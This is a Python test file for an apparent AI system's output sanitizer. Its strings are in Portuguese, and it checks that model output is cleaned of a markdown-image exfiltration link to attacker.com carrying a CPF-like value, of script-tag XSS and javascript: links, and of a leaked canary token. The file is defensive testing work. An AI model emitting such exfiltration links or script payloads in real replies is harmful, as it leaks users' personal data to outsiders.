from ia.security.output_guard import OutputGuard


def test_output_guard_neutralizes_markdown_image_exfiltration():
    # Tentativa de Data Exfiltration via imagem Markdown
    malicious_output = (
        "Aqui está sua resposta: "
        "![exfil](https://attacker.com/leak?data=CPF12345) "
        "Você deve comparecer à Polícia Federal."
    )
    clean, is_safe, reason = OutputGuard.sanitize(malicious_output)

    assert is_safe is True
    assert "![exfil]" not in clean
    assert "[exfil]" in clean
    assert "https://attacker.com/leak" not in clean or "![exfil]" not in clean


def test_output_guard_strips_html_tags():
    html_output = "Resposta com <script>alert('XSS')</script> e <b>texto</b>."
    clean, is_safe, reason = OutputGuard.sanitize(html_output)

    assert is_safe is True
    assert "<script>" not in clean
    assert "</script>" not in clean
    assert "alert('XSS')" in clean
    assert "<b>" not in clean


def test_output_guard_neutralizes_dangerous_protocols():
    link_attack = "Clique [aqui](javascript:alert(1)) para continuar ou [link seguro](https://www.gov.br)."
    clean, is_safe, reason = OutputGuard.sanitize(link_attack)

    assert is_safe is True
    assert "javascript:" not in clean
    assert "Clique aqui para continuar" in clean
    assert "[link seguro](https://www.gov.br)" in clean


def test_output_guard_blocks_canary_leakage():
    token = "CANARY_SECURE999"
    leaked_output = f"Meu token interno é {token}."

    clean, is_safe, reason = OutputGuard.sanitize(leaked_output, canary_token=token)

    assert is_safe is False
    assert reason == "canary_leakage_detected"
    assert clean == ""
